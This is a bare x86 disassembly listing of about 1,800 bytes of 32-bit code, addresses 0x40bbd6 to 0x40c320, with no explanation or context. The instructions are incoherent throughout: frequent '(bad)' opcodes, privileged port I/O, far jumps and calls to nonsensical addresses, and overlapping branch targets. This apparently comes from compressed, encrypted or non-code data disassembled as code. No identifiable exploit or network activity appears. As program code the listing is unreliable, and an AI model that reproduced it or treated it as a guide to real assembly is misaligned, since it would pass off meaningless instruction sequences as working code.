  40bbd6:	call   0xafab:0xc9ce56e5
  40bbdd:	clc    
  40bbde:	mov    bl,0xd0
  40bbe0:	mov    eax,0xefe63b88
  40bbe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbe6:	dec    edi
  40bbe7:	test   al,0x9a
  40bbe9:	ds js  0x40bc25
  40bbec:	je     0x40bbbc
  40bbee:	add    eax,0xcd35caf5
  40bbf3:	in     al,0xe6
  40bbf5:	sbb    ch,cl
  40bbf7:	out    0x1f,eax
  40bbf9:	shl    BYTE PTR [edi],0x65
  40bbfc:	push   ds
  40bbfd:	jmp    0x40bbcd
  40bbff:	jbe    0x40bc58
  40bc01:	cmp    DWORD PTR [ebx-0x3017105b],edi
  40bc07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc08:	push   0x52
  40bc0a:	mov    al,0xb9
  40bc0c:	div    BYTE PTR [ecx]
  40bc0e:	aam    0x6f
  40bc10:	xchg   edi,eax
  40bc11:	sbb    esi,DWORD PTR [edx]
  40bc13:	mov    al,0x3
  40bc15:	jge    0x40bc79
  40bc17:	dec    edi
  40bc18:	(bad)  
  40bc19:	xor    ah,BYTE PTR [edi+edi*2]
  40bc1c:	inc    ebx
  40bc1d:	sub    esp,ecx
  40bc1f:	cmp    DWORD PTR [edi],eax
  40bc21:	jmp    0x40bc1e
  40bc23:	fnstcw WORD PTR [edx]
  40bc25:	jge    0x40bbdd
  40bc27:	sbb    BYTE PTR [edi+0x1280535d],ch
  40bc2d:	adc    BYTE PTR [edi+0x60],ch
  40bc30:	pop    ebx
  40bc31:	xchg   esi,eax
  40bc32:	fsubr  QWORD PTR [eax+ecx*4]
  40bc35:	sar    DWORD PTR [eax-0x29],cl
  40bc38:	inc    edi
  40bc39:	imul   ebx,ebp,0x9544e1b0
  40bc3f:	push   esp
  40bc40:	das    
  40bc41:	pop    ebp
  40bc42:	fnstcw WORD PTR [esi-0x55d8a3c2]
  40bc48:	pop    ebp
  40bc49:	cwde   
  40bc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc4b:	retf   0xb247
  40bc4e:	outs   dx,DWORD PTR ds:[esi]
  40bc4f:	rol    DWORD PTR [ebx],1
  40bc51:	sub    al,BYTE PTR [ecx]
  40bc53:	jmp    0x40bcb4
  40bc55:	out    0xd8,al
  40bc57:	ror    BYTE PTR ds:0x4b8f20e2,0x51
  40bc5e:	pop    esp
  40bc5f:	scas   eax,DWORD PTR es:[edi]
  40bc60:	xchg   esp,eax
  40bc61:	minps  xmm2,XMMWORD PTR [ecx+0x788da756]
  40bc68:	cwde   
  40bc69:	(bad)  
  40bc6a:	out    dx,eax
  40bc6b:	jge    0x40bc19
  40bc6d:	mov    esi,0x94bba7d5
  40bc72:	cmp    eax,0xa9d538a8
  40bc77:	cli    
  40bc78:	or     dl,BYTE PTR [ebx+0x7a568337]
  40bc7e:	xor    DWORD PTR [edx],0x122dc63b
  40bc84:	adc    dl,BYTE PTR [edx-0x2e]
  40bc87:	mov    esp,0xa8504fa9
  40bc8c:	aam    0xfa
  40bc8e:	lds    eax,FWORD PTR [edi+edi*2+0x61]
  40bc92:	dec    ebp
  40bc93:	mov    al,ds:0xa93adebc
  40bc98:	loope  0x40bcf7
  40bc9a:	rol    DWORD PTR [eax+0x76c9d627],0xf4
  40bca1:	(bad)  [ebx]
  40bca3:	ret    0x288d
  40bca6:	mov    dh,0x1a
  40bca8:	adc    ecx,DWORD PTR [ebx]
  40bcaa:	push   ds
  40bcab:	ror    BYTE PTR [ebx+eax*1],cl
  40bcae:	jge    0x40bd0d
  40bcb0:	mov    ds:0x54ca2d0a,eax
  40bcb5:	add    BYTE PTR [eax+0x16d2706b],ch
  40bcbb:	mov    ds:0x770606e,al
  40bcc0:	xor    BYTE PTR [eax],ch
  40bcc2:	jne    0x40bcf7
  40bcc4:	dec    eax
  40bcc5:	cmp    DWORD PTR [ebp-0x65bd7919],ebp
  40bccb:	mov    esi,DWORD PTR [eax]
  40bccd:	push   ebx
  40bcce:	inc    eax
  40bccf:	push   ds
  40bcd0:	adc    BYTE PTR [edi-0x63],cl
  40bcd3:	lahf   
  40bcd4:	js     0x40bc7a
  40bcd6:	lds    ebp,FWORD PTR [eax-0x5fedeb5c]
  40bcdc:	xchg   edi,eax
  40bcdd:	mov    dl,0x23
  40bcdf:	add    DWORD PTR [edi],0xe
  40bce2:	loop   0x40bd23
  40bce4:	mov    esi,0xa9705001
  40bce9:	jle    0x40bcd9
  40bceb:	popa   
  40bcec:	test   DWORD PTR [edx-0x2a],ebx
  40bcef:	dec    ebx
  40bcf0:	je     0x40bd30
  40bcf2:	scas   al,BYTE PTR es:[edi]
  40bcf3:	push   ebp
  40bcf4:	(bad)  
  40bcf5:	xchg   ebx,eax
  40bcf6:	hlt    
  40bcf7:	shl    BYTE PTR [esi],1
  40bcf9:	mov    bh,0x6d
  40bcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcfc:	pusha  
  40bcfd:	jo     0x40bd17
  40bcff:	(bad)  
  40bd00:	xor    BYTE PTR [ecx],bh
  40bd02:	xchg   esp,eax
  40bd03:	jbe    0x40bd66
  40bd05:	outs   dx,BYTE PTR ds:[esi]
  40bd06:	dec    ecx
  40bd07:	icebp  
  40bd08:	in     al,0x8d
  40bd0a:	or     cl,ch
  40bd0c:	jge    0x40bd79
  40bd0e:	xor    eax,esp
  40bd10:	data16 (bad) 
  40bd13:	push   esi
  40bd14:	test   ch,bl
  40bd16:	icebp  
  40bd17:	cld    
  40bd18:	mov    al,0xc7
  40bd1a:	mov    ds,eax
  40bd1c:	xor    esi,edi
  40bd1e:	mov    edi,0x247542f8
  40bd23:	sub    eax,0x4b7ce4a2
  40bd28:	add    BYTE PTR [edx+ebp*1],0x69
  40bd2c:	popf   
  40bd2d:	inc    edx
  40bd2e:	addr16 push 0x74
  40bd31:	sbb    DWORD PTR [ebp+0x691184d5],ebx
  40bd37:	call   0xff72fc96
  40bd3c:	cmp    al,0xb5
  40bd3e:	mov    BYTE PTR [eax-0x2619ef6f],bl
  40bd44:	repz mov esp,DWORD PTR [edx+0x73f358b]
  40bd4b:	jp     0x40bce9
  40bd4d:	pop    eax
  40bd4e:	rcl    ch,cl
  40bd50:	adc    BYTE PTR [ebp+0x40],al
  40bd53:	cmp    esi,DWORD PTR [eax+0x7c]
  40bd56:	pop    esp
  40bd57:	xchg   edi,eax
  40bd58:	inc    esi
  40bd59:	iret   
  40bd5a:	aad    0xff
  40bd5c:	sbb    esi,DWORD PTR [ebx+0x65430910]
  40bd62:	cmp    eax,0xd818e1ae
  40bd67:	sbb    ah,BYTE PTR [ebx+esi*8]
  40bd6a:	stos   BYTE PTR es:[edi],al
  40bd6b:	jl     0x40bde3
  40bd6d:	pop    esi
  40bd6e:	mov    edx,0xb1742851
  40bd73:	fstp   TBYTE PTR [esi-0x38]
  40bd76:	test   BYTE PTR [ebx+0x71],0xba
  40bd7a:	aaa    
  40bd7b:	push   ecx
  40bd7c:	icebp  
  40bd7d:	(bad)  
  40bd7e:	stos   BYTE PTR es:[edi],al
  40bd7f:	stos   DWORD PTR es:[edi],eax
  40bd80:	or     dh,BYTE PTR [ecx+0x2ab3be75]
  40bd86:	sub    al,bh
  40bd88:	cmp    BYTE PTR [ebx+0x1be252d2],dl
  40bd8e:	push   esp
  40bd8f:	xchg   BYTE PTR [edx+ebp*1+0x6592275a],bh
  40bd96:	(bad)  [edi-0x35]
  40bd99:	dec    eax
  40bd9a:	jmp    0x40bd64
  40bd9c:	shl    cl,1
  40bd9e:	pop    DWORD PTR [eax+0x6b]
  40bda1:	imul   BYTE PTR [ebx]
  40bda3:	cmc    
  40bda4:	fidiv  WORD PTR [eax]
  40bda6:	je     0x40bdae
  40bda8:	retf   0x695a
  40bdab:	xor    DWORD PTR [eax],0x3d504cd9
  40bdb1:	(bad)  
  40bdb2:	fs mov eax,0xdef1cbb1
  40bdb8:	and    DWORD PTR [eax+0x5a],eax
  40bdbb:	imul   esi,esi,0xfffffff9
  40bdbe:	mov    al,ds:0x279df390
  40bdc3:	cmp    dh,BYTE PTR [edi-0x3ba64518]
  40bdc9:	or     BYTE PTR [esi+0x8ae8445],ah
  40bdcf:	jns    0x40bd8d
  40bdd1:	in     al,dx
  40bdd2:	xor    al,0xe7
  40bdd4:	sbb    DWORD PTR [ebx-0x5e18c2e],ebp
  40bdda:	outs   dx,DWORD PTR ds:[esi]
  40bddb:	mov    ecx,0x6f82fda8
  40bde0:	lahf   
  40bde1:	scas   al,BYTE PTR es:[edi]
  40bde2:	jnp    0x40bd85
  40bde4:	(bad)  
  40bde5:	addr16 leavew 
  40bde8:	push   ecx
  40bde9:	cmp    BYTE PTR [ebp-0x6c],0x60
  40bded:	test   al,bl
  40bdef:	out    0xef,al
  40bdf1:	add    DWORD PTR [ecx-0x1efb9761],0xcaeeb16
  40bdfb:	jge    0x40bdcd
  40bdfd:	mov    al,ds:0x753ad29c
  40be02:	(bad)  [edx-0x6e]
  40be05:	sub    DWORD PTR [ebx-0x1a],ecx
  40be08:	pop    edx
  40be09:	lahf   
  40be0a:	mov    ebp,0x309d6993
  40be0f:	pop    ecx
  40be10:	lahf   
  40be11:	sub    BYTE PTR [ebx],ch
  40be13:	inc    ebx
  40be14:	cld    
  40be15:	inc    edi
  40be16:	test   al,0x8b
  40be18:	test   BYTE PTR [edx],dh
  40be1a:	pop    esi
  40be1b:	std    
  40be1c:	sbb    eax,0xf31aedc2
  40be21:	xor    DWORD PTR [edx+0x3885cd65],edx
  40be27:	repz dec ecx
  40be29:	mov    esp,0x7634a4d3
  40be2e:	or     DWORD PTR ds:0x11b1497f,eax
  40be34:	lahf   
  40be35:	std    
  40be36:	sub    ecx,DWORD PTR [edi-0xa]
  40be39:	cmp    edi,0xffffffe9
  40be3c:	sbb    eax,0x24b6da51
  40be41:	mov    BYTE PTR [ebp-0x47de212b],dl
  40be47:	inc    ecx
  40be48:	pop    esi
  40be49:	pop    es
  40be4a:	cmp    ecx,DWORD PTR [edi+0x524afb51]
  40be50:	pop    esp
  40be51:	fisttp WORD PTR [ebx+0x1f]
  40be54:	sub    BYTE PTR [edi+ebx*1],dh
  40be57:	ror    BYTE PTR [edi-0x58],1
  40be5a:	int    0x51
  40be5c:	push   edi
  40be5d:	hlt    
  40be5e:	out    0x82,al
  40be60:	inc    ch
  40be62:	mov    dl,0xec
  40be64:	sub    BYTE PTR [eax+0x3f],dl
  40be67:	adc    dh,dl
  40be69:	and    al,0x9d
  40be6b:	inc    edx
  40be6c:	js     0x40be46
  40be6e:	or     dh,BYTE PTR [edx+edx*8]
  40be71:	scas   al,BYTE PTR es:[edi]
  40be72:	xor    eax,0x7198067f
  40be77:	pop    ebp
  40be78:	scas   eax,DWORD PTR es:[edi]
  40be79:	mov    al,0x74
  40be7b:	sub    DWORD PTR [ecx],ebp
  40be7d:	fidiv  DWORD PTR [ebx-0x22]
  40be80:	mov    dh,0x67
  40be82:	cmp    ecx,DWORD PTR [edi]
  40be84:	je     0x40be1e
  40be86:	mov    edx,0x385e1501
  40be8b:	pushf  
  40be8c:	dec    ebp
  40be8d:	xchg   ah,bl
  40be8f:	inc    esi
  40be90:	push   ecx
  40be91:	ins    DWORD PTR es:[edi],dx
  40be92:	ret    0x2ad5
  40be95:	dec    ebp
  40be96:	test   eax,0x93a81f86
  40be9b:	neg    DWORD PTR [ecx-0x4a]
  40be9e:	and    BYTE PTR [ebx+0x49],ch
  40bea1:	jne    0x40beb3
  40bea3:	push   0xb9b2c632
  40bea8:	in     al,0xa6
  40beaa:	call   0xffd2b524
  40beaf:	fdivr  DWORD PTR [esi+0x49]
  40beb2:	adc    ebx,esp
  40beb4:	fdivr  st(3),st
  40beb6:	stc    
  40beb7:	dec    eax
  40beb8:	pop    eax
  40beb9:	imul   eax,DWORD PTR [esp+eiz*4+0x1a2440d0],0xffffffa1
  40bec1:	js     0x40beee
  40bec3:	xchg   edx,eax
  40bec4:	loopne 0x40be80
  40bec6:	and    ah,BYTE PTR [ebp-0x2a]
  40bec9:	ins    BYTE PTR es:[edi],dx
  40beca:	fdivr  DWORD PTR [edi+0x5a300ebe]
  40bed0:	ret    0xc41
  40bed3:	inc    ebp
  40bed4:	icebp  
  40bed5:	cmp    eax,eax
  40bed7:	ficom  WORD PTR [esp+edx*2+0x175392b]
  40bede:	fucomi st,st(7)
  40bee0:	jmp    0x40bf0b
  40bee2:	scas   eax,DWORD PTR es:[edi]
  40bee3:	sbb    eax,0x91901473
  40bee8:	push   0x6f
  40beea:	mov    dh,0x1f
  40beec:	test   al,0x2a
  40beee:	stos   DWORD PTR es:[edi],eax
  40beef:	pop    ds
  40bef0:	loopne 0x40be78
  40bef2:	loopne 0x40be8e
  40bef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef5:	out    dx,eax
  40bef6:	rcl    BYTE PTR [edi],1
  40bef8:	sbb    bh,BYTE PTR [ecx]
  40befa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40befb:	jb     0x40be81
  40befd:	lea    esp,[esp+eax*2+0x1e]
  40bf01:	pop    ss
  40bf02:	fsub   DWORD PTR [edi-0x2a9f68e9]
  40bf08:	dec    ebx
  40bf09:	pop    eax
  40bf0a:	ins    BYTE PTR es:[edi],dx
  40bf0b:	loop   0x40bf45
  40bf0d:	fnstcw WORD PTR [ebx+edi*8-0x5b570b7a]
  40bf14:	sar    esi,1
  40bf16:	dec    ebx
  40bf17:	std    
  40bf18:	pop    eax
  40bf19:	shl    DWORD PTR [esi-0x286e4f30],cl
  40bf1f:	test   DWORD PTR [eax+0x15],esi
  40bf22:	xchg   bh,bl
  40bf24:	sbb    BYTE PTR [ebx+0x5c304b09],0xc3
  40bf2b:	inc    esp
  40bf2c:	cmp    BYTE PTR [esi-0x5e],0xbf
  40bf30:	jno    0x40bef3
  40bf32:	cmp    eax,0x86914de9
  40bf37:	cmp    eax,0x6892a7fa
  40bf3c:	sub    DWORD PTR [edx-0xb7a709],esi
  40bf42:	(bad)  
  40bf43:	jbe    0x40befc
  40bf45:	(bad)  
  40bf46:	call   0xc89e50f4
  40bf4b:	fwait
  40bf4c:	rcl    al,1
  40bf4e:	int    0xf9
  40bf50:	inc    edx
  40bf51:	gs cld 
  40bf53:	mov    cl,0xdb
  40bf55:	and    esp,DWORD PTR [edi]
  40bf57:	inc    ecx
  40bf58:	sahf   
  40bf59:	call   0x7263665f
  40bf5e:	(bad)  
  40bf60:	pop    es
  40bf61:	pop    es
  40bf62:	cmp    edi,edx
  40bf64:	cli    
  40bf65:	fisttp WORD PTR [edx+esi*8]
  40bf68:	(bad)  
  40bf69:	jg     0x40bf96
  40bf6b:	sbb    al,0x7b
  40bf6d:	out    dx,al
  40bf6e:	dec    eax
  40bf6f:	mov    edx,0x98b35751
  40bf74:	xchg   ebx,eax
  40bf75:	fisttp DWORD PTR [ebx-0x52]
  40bf78:	retf   0x6bd8
  40bf7b:	xlat   BYTE PTR ds:[ebx]
  40bf7c:	pop    ds
  40bf7d:	xchg   dl,dh
  40bf7f:	sahf   
  40bf80:	and    al,0xf8
  40bf82:	xor    edx,edx
  40bf84:	(bad)  
  40bf85:	es pop eax
  40bf87:	std    
  40bf88:	cdq    
  40bf89:	rcl    DWORD PTR [ebp+esi*8+0x3f],cl
  40bf8d:	pop    eax
  40bf8e:	inc    DWORD PTR [eax+0x4dd10860]
  40bf94:	shl    DWORD PTR [edx],cl
  40bf96:	sub    eax,0x1e6fd370
  40bf9b:	and    al,0x75
  40bf9d:	out    0x18,eax
  40bf9f:	pop    ds
  40bfa0:	or     bl,BYTE PTR [ecx]
  40bfa2:	ret    
  40bfa3:	pop    esi
  40bfa4:	sbb    DWORD PTR [ecx+eiz*1],ebp
  40bfa7:	mov    ?,WORD PTR [esi]
  40bfa9:	jae    0x40bf54
  40bfab:	hlt    
  40bfac:	mov    edx,0x96953dd7
  40bfb1:	leave  
  40bfb2:	call   0x2b3d0fc9
  40bfb7:	cmc    
  40bfb8:	jp     0x40bf9a
  40bfba:	ins    BYTE PTR es:[edi],dx
  40bfbb:	mov    bh,0x30
  40bfbd:	xchg   esi,eax
  40bfbe:	fs push ds
  40bfc0:	imul   ecx,DWORD PTR [esi-0x33],0x20ab14a2
  40bfc7:	(bad)  [edx-0x43d90b5e]
  40bfcd:	mov    ds:0xe1ed4987,eax
  40bfd2:	stc    
  40bfd3:	pop    edi
  40bfd4:	fwait
  40bfd5:	ja     0x40bfdc
  40bfd7:	aaa    
  40bfd8:	std    
  40bfd9:	jbe    0x40c01b
  40bfdb:	adc    ebp,DWORD PTR [edi+0x7341dcfc]
  40bfe1:	(bad)  
  40bfe2:	(bad)  
  40bfe3:	push   DWORD PTR [esi-0x6d3e68a7]
  40bfe9:	pusha  
  40bfea:	sbb    eax,0xe65ac98f
  40bfef:	sbb    al,0x7
  40bff1:	test   eax,0xf6e2f655
  40bff6:	jb     0x40bfc2
  40bff8:	ins    DWORD PTR es:[edi],dx
  40bff9:	loop   0x40bfe7
  40bffb:	push   edx
  40bffc:	push   esp
  40bffd:	cs lock cwde 
  40c000:	adc    edx,DWORD PTR [esi-0x2c3d88bb]
  40c006:	jge    0x40bfa0
  40c008:	or     DWORD PTR [ecx+0x3],ebp
  40c00b:	mov    dl,0xd5
  40c00d:	fstp   QWORD PTR es:[ecx+esi*2+0x1b]
  40c012:	add    ah,BYTE PTR [ebx-0x61]
  40c015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c016:	jge    0x40c037
  40c018:	dec    esi
  40c019:	add    BYTE PTR [eax+0x4621c42b],0x8
  40c020:	(bad)  
  40c022:	push   ds
  40c023:	loope  0x40c05e
  40c025:	or     eax,0x10828e70
  40c02a:	jnp    0x40c04f
  40c02c:	cmc    
  40c02d:	rol    DWORD PTR [edx-0x4ecdec61],cl
  40c033:	imul   edx,DWORD PTR [edi],0x7d80036f
  40c039:	adc    BYTE PTR [eax+eax*4],al
  40c03c:	sar    esp,cl
  40c03e:	sub    bh,ch
  40c040:	inc    esi
  40c041:	lea    eax,[ecx+0x506cf5e7]
  40c047:	shl    DWORD PTR [edi+0x67],1
  40c04a:	add    eax,0xe1d81dfc
  40c04f:	jle    0x40c03d
  40c051:	fidiv  DWORD PTR [edx+0x7a]
  40c054:	imul   esp,DWORD PTR [edi+0x79],0x78
  40c058:	stos   DWORD PTR es:[edi],eax
  40c059:	push   ebx
  40c05a:	push   ecx
  40c05b:	push   0xfffffff8
  40c05d:	retf   0x56e9
  40c060:	push   esi
  40c061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c062:	adc    bl,cl
  40c064:	out    0x3f,eax
  40c066:	(bad)  
  40c067:	ficomp WORD PTR ds:0x5fd1f85f
  40c06d:	test   BYTE PTR [ebx],0x9e
  40c070:	(bad)  
  40c071:	in     eax,dx
  40c072:	xlat   BYTE PTR ds:[ebx]
  40c073:	shl    BYTE PTR [edi+0x3b291057],1
  40c079:	xchg   edx,eax
  40c07a:	sub    eax,0x4fcd944e
  40c07f:	rol    eax,cl
  40c081:	dec    edx
  40c082:	int    0x17
  40c084:	add    BYTE PTR [ebx],0xbd
  40c087:	add    ebp,DWORD PTR [edi]
  40c089:	or     DWORD PTR [edi],esi
  40c08b:	imul   ebx,DWORD PTR [ecx+ebx*8+0x53de57c2],0xffffffb3
  40c093:	xor    DWORD PTR [edi-0x2c],0xffffff9f
  40c097:	scas   al,BYTE PTR es:[edi]
  40c098:	sar    DWORD PTR [eax+0xfef696b],cl
  40c09e:	in     al,dx
  40c09f:	arpl   cx,bp
  40c0a1:	cmp    al,0xfd
  40c0a3:	scas   al,BYTE PTR es:[edi]
  40c0a4:	mov    eax,ds:0xa2023a12
  40c0a9:	sub    eax,0x2169c8a9
  40c0ae:	add    dl,BYTE PTR [edi-0x19]
  40c0b1:	and    DWORD PTR [ecx+edx*1],ecx
  40c0b4:	out    0xbe,al
  40c0b6:	lahf   
  40c0b7:	ss adc al,0xcc
  40c0ba:	cmp    DWORD PTR [eax],0xc3b4aa55
  40c0c0:	or     DWORD PTR [ebx+0x6b0b22fd],0xffffffb9
  40c0c7:	mov    eax,ds:0x63358c28
  40c0cc:	mov    esp,DWORD PTR [esi-0x81668fc]
  40c0d2:	sub    ecx,DWORD PTR [ebx-0x3086dd1f]
  40c0d8:	or     BYTE PTR [ebx],al
  40c0da:	jmp    0x40c080
  40c0dc:	ss das 
  40c0de:	mov    esi,DWORD PTR [esi]
  40c0e0:	idiv   BYTE PTR [eax+0xe]
  40c0e3:	and    DWORD PTR [ebx],0x8500b6e9
  40c0e9:	fstp   DWORD PTR [ebx-0x43]
  40c0ec:	stos   BYTE PTR es:[edi],al
  40c0ed:	pop    eax
  40c0ee:	ins    DWORD PTR es:[edi],dx
  40c0ef:	in     al,0xcf
  40c0f1:	or     DWORD PTR [ebx-0xbbcefcb],esp
  40c0f7:	retf   
  40c0f8:	adc    BYTE PTR [ebp+eax*4-0x3b004c60],al
  40c0ff:	push   esp
  40c100:	out    0x1a,eax
  40c102:	(bad)  
  40c104:	shl    ebx,cl
  40c106:	sub    BYTE PTR [ebx],0xb7
  40c109:	mov    ds:0x1f8cf627,eax
  40c10e:	jmp    0x405e00f6
  40c113:	mov    ds:0xa70fb0b9,eax
  40c118:	retf   0xa65f
  40c11b:	iret   
  40c11c:	lods   al,BYTE PTR ds:[esi]
  40c11d:	ins    DWORD PTR es:[edi],dx
  40c11e:	pop    edx
  40c11f:	dec    esp
  40c120:	loope  0x40c19b
  40c122:	lock fidivr WORD PTR ds:0x333410d1
  40c129:	icebp  
  40c12a:	ret    
  40c12b:	xchg   ebp,eax
  40c12c:	std    
  40c12d:	jb     0x40c0cf
  40c12f:	sub    al,0x36
  40c131:	loopne 0x40c172
  40c133:	push   0xacb2178a
  40c138:	aas    
  40c139:	bound  ebx,QWORD PTR [ebx-0x73]
  40c13c:	and    eax,0xcae4437e
  40c141:	dec    ebx
  40c142:	std    
  40c143:	cld    
  40c144:	div    BYTE PTR [eax-0x6fcbb001]
  40c14a:	into   
  40c14b:	xor    BYTE PTR [edx],ah
  40c14d:	arpl   WORD PTR [edx],dx
  40c14f:	aas    
  40c150:	mov    cl,dh
  40c152:	js     0x40c12f
  40c154:	mov    al,0x2d
  40c156:	hlt    
  40c157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c158:	xchg   edx,eax
  40c159:	sbb    eax,0x4a135871
  40c15e:	xor    dh,BYTE PTR [esi]
  40c160:	mov    eax,0xa3af6f0f
  40c165:	retf   
  40c166:	shr    DWORD PTR [eax-0x7b059332],0xe9
  40c16d:	nop
  40c16e:	xchg   DWORD PTR [esi+0x0],esi
  40c171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c172:	cmp    BYTE PTR [ebx-0x1a9bcaeb],dh
  40c178:	ret    
  40c179:	lods   al,BYTE PTR ds:[esi]
  40c17a:	popa   
  40c17b:	jb     0x40c139
  40c17d:	pop    es
  40c17e:	cld    
  40c17f:	repnz nop
  40c181:	mov    ah,0x25
  40c183:	pop    ds
  40c184:	adc    edi,DWORD PTR [esi+0x312ce4f7]
  40c18a:	xchg   esi,eax
  40c18b:	xchg   esi,eax
  40c18c:	pushf  
  40c18d:	js     0x40c174
  40c18f:	mov    BYTE PTR [ebx-0x76c7a534],cl
  40c195:	dec    esp
  40c196:	(bad)  
  40c197:	scas   eax,DWORD PTR es:[edi]
  40c198:	mov    ah,0x45
  40c19a:	jge    0x40c134
  40c19c:	push   edi
  40c19d:	retf   0x2951
  40c1a0:	or     cl,ah
  40c1a2:	retf   
  40c1a3:	das    
  40c1a4:	addr16 xchg edx,eax
  40c1a6:	xor    BYTE PTR [edi-0x79],0xb6
  40c1aa:	mov    bl,0x31
  40c1ac:	jae    0x40c153
  40c1ae:	or     ebp,DWORD PTR [eax+0x22]
  40c1b1:	sub    al,0xbb
  40c1b3:	fld    DWORD PTR [ebx-0x62d81936]
  40c1b9:	and    eax,0xc7e1f63f
  40c1be:	popf   
  40c1bf:	mov    ah,0x63
  40c1c1:	lock or BYTE PTR [ecx-0x6358653e],bl
  40c1c8:	addr16 inc eax
  40c1ca:	and    DWORD PTR [ecx-0x17],0x52
  40c1ce:	or     al,0x84
  40c1d0:	test   DWORD PTR [edi],ecx
  40c1d2:	retf   
  40c1d3:	mov    ebp,esp
  40c1d5:	aaa    
  40c1d6:	aam    0x0
  40c1d8:	sbb    BYTE PTR [ecx],0xf1
  40c1db:	push   edx
  40c1dc:	mov    ch,0xe5
  40c1de:	mov    ebp,esp
  40c1e0:	in     eax,dx
  40c1e1:	sar    BYTE PTR [edx+0x35],cl
  40c1e4:	out    0x99,eax
  40c1e6:	sub    esi,DWORD PTR [edx-0xa]
  40c1e9:	int    0x78
  40c1eb:	shr    BYTE PTR [edi],cl
  40c1ed:	and    edi,esp
  40c1ef:	inc    edi
  40c1f0:	in     eax,0xef
  40c1f2:	xchg   ebx,eax
  40c1f3:	fld    TBYTE PTR [ebx-0x39]
  40c1f6:	loope  0x40c26f
  40c1f8:	push   edx
  40c1f9:	sbb    esi,esi
  40c1fb:	push   eax
  40c1fc:	or     eax,0x9ae5219d
  40c201:	adc    BYTE PTR [esi+0x7ab29f4c],0xd6
  40c208:	ficomp DWORD PTR [edx-0x2dae925e]
  40c20e:	mov    bh,0x58
  40c210:	cmp    edi,DWORD PTR [eax+0x23fb8225]
  40c216:	(bad)  
  40c217:	pop    ecx
  40c218:	test   al,0x58
  40c21a:	sbb    BYTE PTR [eax-0xcbfe8d6],0xee
  40c221:	out    dx,al
  40c222:	xchg   ebx,eax
  40c223:	fprem1 
  40c225:	inc    ecx
  40c226:	pop    edx
  40c227:	rcl    esp,cl
  40c229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c22a:	ret    0x7806
  40c22d:	and    DWORD PTR [edi],ebx
  40c22f:	int    0xe2
  40c231:	sub    BYTE PTR [ecx+0x21],ch
  40c234:	fisttp WORD PTR [edx]
  40c236:	clc    
  40c237:	cmp    BYTE PTR [edi],ah
  40c239:	push   eax
  40c23a:	inc    edi
  40c23b:	jb     0x40c28d
  40c23d:	cli    
  40c23e:	sub    BYTE PTR [eax-0x70],bl
  40c241:	sahf   
  40c242:	(bad)  
  40c243:	and    DWORD PTR [eax-0x17],ebx
  40c246:	lahf   
  40c247:	pop    ebx
  40c248:	mov    ecx,0x8f29943e
  40c24d:	push   esi
  40c24e:	es ins BYTE PTR es:[edi],dx
  40c250:	mov    esp,0x3be54308
  40c255:	aas    
  40c256:	dec    ebx
  40c257:	sbb    al,0xfe
  40c259:	repz (bad) 
  40c25b:	xchg   ebp,eax
  40c25c:	dec    edi
  40c25d:	aas    
  40c25e:	fcmovb st,st(4)
  40c260:	add    BYTE PTR [esi],0xab
  40c263:	das    
  40c264:	imul   edi,DWORD PTR [ebx-0x30],0x74557f55
  40c26b:	cmc    
  40c26c:	lahf   
  40c26d:	clc    
  40c26e:	mov    es,WORD PTR [edx]
  40c270:	mov    edx,0x7cd2e6cb
  40c275:	outs   dx,BYTE PTR ds:[esi]
  40c276:	xor    BYTE PTR [ecx],bl
  40c278:	jecxz  0x40c241
  40c27a:	inc    ebp
  40c27b:	push   ebp
  40c27c:	jmp    0xc5892f9f
  40c281:	add    edx,DWORD PTR [ebx-0x3843a00d]
  40c287:	popf   
  40c288:	dec    ebp
  40c289:	xor    BYTE PTR [ebp+eax*1-0x3935a2c3],bl
  40c290:	iret   
  40c291:	ja     0x40c246
  40c293:	fmul   QWORD PTR [eax+0x69]
  40c296:	dec    ecx
  40c297:	(bad)  [esi]
  40c299:	dec    ebp
  40c29a:	mov    ds:0xe4faba8e,al
  40c29f:	dec    ebp
  40c2a0:	sbb    DWORD PTR [ebx],edi
  40c2a2:	inc    esp
  40c2a3:	xor    ebx,0x11023158
  40c2a9:	pop    es
  40c2aa:	push   0xfffffff7
  40c2ac:	mov    ebx,DWORD PTR [ecx]
  40c2ae:	pop    ebx
  40c2b0:	mov    eax,ds:0x1b048c66
  40c2b5:	sub    al,0x7b
  40c2b7:	xor    eax,0x2beae5d
  40c2bc:	push   ds
  40c2bd:	mov    bh,dl
  40c2bf:	mov    gs,WORD PTR [ecx+0x3c]
  40c2c2:	jmp    0x3ed:0xc67f7088
  40c2c9:	test   eax,0x24338f83
  40c2ce:	xor    BYTE PTR [edi+0x7550ec03],dl
  40c2d4:	jno    0x40c31f
  40c2d6:	mov    ebp,0x353f2ce5
  40c2db:	aad    0x17
  40c2dd:	shr    BYTE PTR [ebp-0x38d2eec2],cl
  40c2e3:	sahf   
  40c2e4:	xchg   DWORD PTR [esi],edi
  40c2e6:	push   ebx
  40c2e7:	retf   0xaff6
  40c2ea:	mov    ebx,0x95228a30
  40c2ef:	stos   BYTE PTR es:[edi],al
  40c2f0:	jno    0xb7abc79b
  40c2f6:	out    0xa,al
  40c2f8:	addr16 add eax,0x8d76aed3
  40c2fe:	pop    ebx
  40c2ff:	or     esi,DWORD PTR [ebx]
  40c301:	or     edi,DWORD PTR [ebx]
  40c303:	mov    ebx,0xbda7f943
  40c308:	mov    ch,ah
  40c30a:	test   BYTE PTR [ebp+0x4a58388],bl
  40c310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c311:	jns    0x40c2d2
  40c313:	lahf   
  40c314:	push   cs
  40c315:	into   
  40c316:	dec    esp
  40c317:	pop    edi
  40c318:	out    dx,eax
  40c319:	mov    bl,0x9f
  40c31b:	xlat   BYTE PTR ds:[ebx]
  40c31c:	stc    
  40c31d:	sub    DWORD PTR [eax-0x44],edi
  40c320:	mov    eax,ds:0x9ffc7a4d
